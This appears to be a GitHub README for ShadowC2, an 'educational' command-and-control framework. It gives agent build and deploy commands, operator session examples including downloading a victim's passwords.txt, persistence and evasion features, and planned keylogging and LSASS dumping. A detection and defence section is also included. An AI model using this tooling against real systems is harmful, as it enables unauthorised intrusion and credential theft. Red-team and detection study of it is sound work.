# ShadowC2 - Custom Command & Control Framework

![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Status](https://img.shields.io/badge/status-educational-orange.svg)

> **A lightweight, educational Command & Control framework demonstrating encrypted C2 channels, multi-platform agents, and red team infrastructure concepts.**

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

ShadowC2 is developed as an educational tool to help security professionals understand:
- Command & Control infrastructure
- Detection engineering for C2 traffic
- Secure coding practices in offensive security
- Red team operational techniques

**UNAUTHORIZED use against systems you do not own or have explicit written permission to test is ILLEGAL.**

✅ **Authorized Use:**
- Personal lab environments
- Authorized penetration tests with signed agreements
- Educational settings with proper supervision
- Security research with ethical approval

❌ **Prohibited Use:**
- Unauthorized access to computer systems
- Malicious activities of any kind
- Production environments without authorization

**The author assumes NO responsibility for misuse. Use at your own risk.**

---

## 🎯 Project Overview

ShadowC2 is a custom-built Command & Control framework that demonstrates how modern red team infrastructure operates. Unlike off-the-shelf tools, this project was built from the ground up to showcase:

- **Encrypted Communications:** AES-256-GCM encryption for all C2 traffic
- **Multi-Client Management:** Handle multiple agent sessions simultaneously
- **Cross-Platform Agents:** Windows and Linux support
- **HTTP-Based C2:** Traffic designed to blend with normal web traffic
- **Modular Design:** Easy to extend with new capabilities
- **Operator Dashboard:** Web-based interface for session management

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    OPERATOR WORKSTATION                      │
│  ┌──────────────────────────────────────────────────────┐   │
│  │           Web Dashboard (Flask UI)                   │   │
│  │  - Session Management                                │   │
│  │  - Command Execution                                 │   │
│  │  - Real-time Logs                                    │   │
│  └───────────────────┬──────────────────────────────────┘   │
│                      │                                       │
│  ┌───────────────────▼──────────────────────────────────┐   │
│  │           C2 Server (Python)                         │   │
│  │  - HTTP Listener (Flask)                             │   │
│  │  - Session Manager                                   │   │
│  │  - Command Queue                                     │   │
│  │  - Encryption/Decryption                             │   │
│  │  - Database (SQLite)                                 │   │
│  └───────────────────┬──────────────────────────────────┘   │
└────────────────────────┼────────────────────────────────────┘
                         │
                         │ HTTPS (Encrypted)
                         │
    ┌────────────────────┼────────────────────┐
    │                    │                    │
┌───▼────┐         ┌────▼─────┐        ┌────▼─────┐
│ Agent  │         │  Agent   │        │  Agent   │
│ (Win)  │         │  (Linux) │        │  (Win)   │
│        │         │          │        │          │
│ Target │         │  Target  │        │  Target  │
│   #1   │         │    #2    │        │    #3    │
└────────┘         └──────────┘        └──────────┘
```

---

## ✨ Features

### C2 Server
- ✅ **Multi-session management** - Handle 10+ concurrent agents
- ✅ **AES-256-GCM encryption** - All traffic encrypted end-to-end
- ✅ **HTTP/HTTPS listener** - Blend with normal web traffic
- ✅ **Command queueing** - Asynchronous command dispatch
- ✅ **Session persistence** - SQLite database for session tracking
- ✅ **Logging system** - Complete audit trail
- ✅ **RESTful API** - Programmatic access to C2 functions

### Agent (Implant)
- ✅ **Encrypted beaconing** - Check-in with randomized jitter
- ✅ **Command execution** - Shell command execution
- ✅ **File operations** - Upload/download files
- ✅ **System enumeration** - Gather host information
- ✅ **Persistence** - Registry/cron-based persistence
- ✅ **Self-destruct** - Remove traces on command
- ✅ **Cross-platform** - Windows and Linux support

### Dashboard
- ✅ **Web-based UI** - Modern, responsive interface
- ✅ **Real-time updates** - Live session status
- ✅ **Command history** - Track all executed commands
- ✅ **Agent details** - View system information per agent
- ✅ **File browser** - Navigate remote file system

---

## 🚀 Quick Start

### Prerequisites
```bash
# Python 3.8 or higher
python3 --version

# Install dependencies
pip install -r requirements.txt
```

### Installation
```bash
# Clone the repository
git clone https://github.com/yourusername/ShadowC2.git
cd ShadowC2

# Install dependencies
pip install -r requirements.txt

# Generate encryption keys
python3 setup.py --generate-keys
```

### Starting the C2 Server
```bash
# Start the server on port 443 (requires root/admin)
sudo python3 server/c2_server.py --host 0.0.0.0 --port 443

# Or use non-privileged port for testing
python3 server/c2_server.py --host 127.0.0.1 --port 8443
```

### Accessing the Dashboard
```
Open browser: https://localhost:8443
Default credentials: admin / changeme
```

### Deploying an Agent
```bash
# Generate agent for Windows
python3 agent/build_agent.py --platform windows --server https://your-c2-server.com:443

# Generate agent for Linux
python3 agent/build_agent.py --platform linux --server https://your-c2-server.com:443

# Output: agent_windows.exe or agent_linux
```

---

## 📖 Usage Examples

### Basic Commands

**List Active Sessions:**
```
ShadowC2> sessions
[*] Active Sessions:
    [1] DESKTOP-ABC123 (192.168.1.100) - Windows 10 - Last seen: 5s ago
    [2] ubuntu-server (192.168.1.101) - Linux - Last seen: 3s ago
```

**Interact with Agent:**
```
ShadowC2> interact 1
[*] Interacting with session 1 (DESKTOP-ABC123)

(session 1)> whoami
nt authority\system

(session 1)> pwd
C:\Windows\System32

(session 1)> shell ipconfig
[Output of ipconfig command...]
```

**File Operations:**
```
(session 1)> upload /tmp/payload.exe C:\Temp\payload.exe
[+] File uploaded successfully

(session 1)> download C:\Users\Admin\Desktop\passwords.txt /tmp/loot/
[+] File downloaded successfully

(session 1)> ls C:\Users\Admin\Desktop
[Directory listing...]
```

**System Enumeration:**
```
(session 1)> sysinfo
[*] Hostname: DESKTOP-ABC123
[*] Username: Administrator
[*] Domain: WORKGROUP
[*] OS: Windows 10 Pro
[*] Architecture: x64
[*] IP Address: 192.168.1.100
[*] MAC Address: 00:0C:29:XX:XX:XX
```

**Persistence:**
```
(session 1)> persistence --install
[+] Persistence installed via Registry Run key

(session 1)> persistence --remove
[+] Persistence removed
```

---

## 🧰 Technical Stack

| Component | Technology |
|-----------|-----------|
| **Server Backend** | Python 3.8+, Flask |
| **Agent** | Python 3.8+ |
| **Encryption** | AES-256-GCM (PyCryptodome) |
| **Database** | SQLite3 |
| **Dashboard UI** | HTML5, Bootstrap 5, JavaScript |
| **Communication** | HTTPS, RESTful API |
| **Packaging** | PyInstaller (for standalone executables) |

---

## 🔐 Security Features

### Encryption
- **Algorithm:** AES-256-GCM (Authenticated Encryption)
- **Key Exchange:** Pre-shared keys (PSK) embedded in agent
- **Session Tokens:** Unique UUID per agent session
- **Integrity:** HMAC validation on all messages

### Traffic Obfuscation
- **HTTP Headers:** Mimics legitimate web traffic
- **User-Agent Rotation:** Randomized browser identifiers
- **Jitter:** Randomized beacon intervals (60-180 seconds)
- **Base64 Encoding:** Commands/responses encoded

### Operational Security
- **No Clear-text Storage:** All sensitive data encrypted at rest
- **Logging Controls:** Configurable log levels and redaction
- **Self-destruct:** Agents can remove themselves on command
- **Anti-debugging:** Basic anti-analysis techniques (optional)

---

## 📁 Project Structure

```
ShadowC2/
├── README.md                 # This file
├── LICENSE                   # MIT License
├── requirements.txt          # Python dependencies
├── setup.py                  # Installation and key generation
│
├── server/
│   ├── c2_server.py         # Main C2 server
│   ├── session_manager.py   # Session handling
│   ├── command_handler.py   # Command processing
│   ├── api_routes.py        # RESTful API endpoints
│   └── database.py          # SQLite operations
│
├── agent/
│   ├── agent.py             # Main agent code
│   ├── build_agent.py       # Agent builder/compiler
│   ├── modules/
│   │   ├── command_exec.py  # Command execution
│   │   ├── file_ops.py      # File upload/download
│   │   ├── persistence.py   # Persistence mechanisms
│   │   └── sysinfo.py       # System enumeration
│   └── config.py            # Agent configuration
│
├── common/
│   ├── crypto.py            # Encryption/decryption
│   ├── protocol.py          # C2 protocol definitions
│   └── utils.py             # Shared utilities
│
├── dashboard/
│   ├── app.py               # Flask dashboard app
│   ├── templates/           # HTML templates
│   └── static/              # CSS, JS, images
│
└── docs/
    ├── ARCHITECTURE.md      # Technical architecture
    ├── API.md               # API documentation
    ├── COMMANDS.md          # Command reference
    └── DEVELOPMENT.md       # Development guide
```

---

## 🎓 Learning Objectives

Building and studying ShadowC2 teaches:

1. **Network Programming**
   - Socket programming in Python
   - HTTP/HTTPS protocol implementation
   - RESTful API design

2. **Cryptography**
   - Symmetric encryption (AES-256)
   - Authenticated encryption (GCM mode)
   - Secure key management

3. **Red Team Tradecraft**
   - C2 infrastructure design
   - Beacon/callback mechanisms
   - Traffic obfuscation techniques
   - Operational security principles

4. **Blue Team Perspective**
   - C2 detection indicators
   - Network traffic analysis
   - Behavioral anomalies
   - Incident response considerations

5. **Software Engineering**
   - Modular architecture
   - Error handling
   - Logging and debugging
   - Cross-platform development

---

## 🛡️ Detection & Defense

### Indicators of Compromise (IOCs)

**Network Indicators:**
- Periodic HTTPS beacons to external IP
- Consistent User-Agent strings
- Base64 encoded payloads in HTTP bodies
- Regular check-ins with fixed jitter

**Host Indicators:**
- Registry persistence keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
- Cron jobs with suspicious commands
- Unsigned executables in temp directories
- Unusual process relationships

### Detection Strategies

1. **Network Monitoring:**
   - Analyze beacon patterns in proxy logs
   - Inspect SSL/TLS certificates
   - Monitor for repeated connections to same endpoint
   - Look for encoded data in HTTP POST bodies

2. **Endpoint Detection:**
   - Monitor registry changes
   - Alert on new scheduled tasks/cron jobs
   - Track unsigned executable launches
   - Analyze process trees for anomalies

3. **SIEM Rules:**
   - Alert on periodic external connections
   - Flag base64 in network traffic
   - Detect new persistence mechanisms
   - Correlate multiple indicators

### Mitigation

- **Network Segmentation:** Limit outbound connections
- **Application Whitelisting:** Block unsigned executables
- **EDR Solutions:** Deploy endpoint detection and response
- **Proxy Filtering:** Inspect HTTPS traffic
- **User Training:** Phishing awareness

---

## 🔬 Advanced Features (Roadmap)

- [ ] **Domain Fronting:** Use CDNs for C2 traffic
- [ ] **DNS Tunneling:** Alternate C2 channel via DNS
- [ ] **In-Memory Execution:** Fileless agent deployment
- [ ] **Screenshot Capture:** Remote desktop surveillance
- [ ] **Keylogging:** Keystroke capture module
- [ ] **Lateral Movement:** Built-in PsExec-style execution
- [ ] **Credential Harvesting:** LSASS dump, mimikatz integration
- [ ] **Multi-hop Pivoting:** Use agents as proxies

---

## 📊 Project Statistics

- **Lines of Code:** ~2,500
- **Modules:** 15+
- **Supported Platforms:** Windows, Linux
- **Encryption:** AES-256-GCM
- **Concurrent Sessions:** 50+ (tested)
- **Development Time:** ~60 hours

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new features
4. Submit a pull request

**Development Guidelines:** See `docs/DEVELOPMENT.md`

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

- **MITRE ATT&CK:** Tactics and techniques reference
- **Cobalt Strike:** Inspiration for C2 architecture
- **Metasploit Framework:** Modular design patterns
- **Red Team Community:** Operational security best practices

---

## 📚 Resources

**Learn More:**
- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [Red Team Operations Course](https://www.offensive-security.com/)
- [The C2 Matrix](https://www.thec2matrix.com/)
- [Detection Engineering](https://www.sans.org/cyber-security-courses/)

**Similar Projects (for study):**
- Cobalt Strike (commercial)
- Empire/Starkiller
- Covenant
- Sliver
- Mythic

---

## 👤 Author

**Akshat**

- 🔗 LinkedIn: [https://www.linkedin.com/in/akshat-singh-0971832b5]
- 📧 Email: [saksht0@gmail.com]

---

## ⭐ Star This Project

If you find ShadowC2 useful for learning, please consider giving it a star on GitHub!

---

<p align="center">
  <i>Built for education, designed for understanding</i><br>
  <i>🔴 Red Team | 🔵 Blue Team | 🟣 Purple Team</i>
</p>
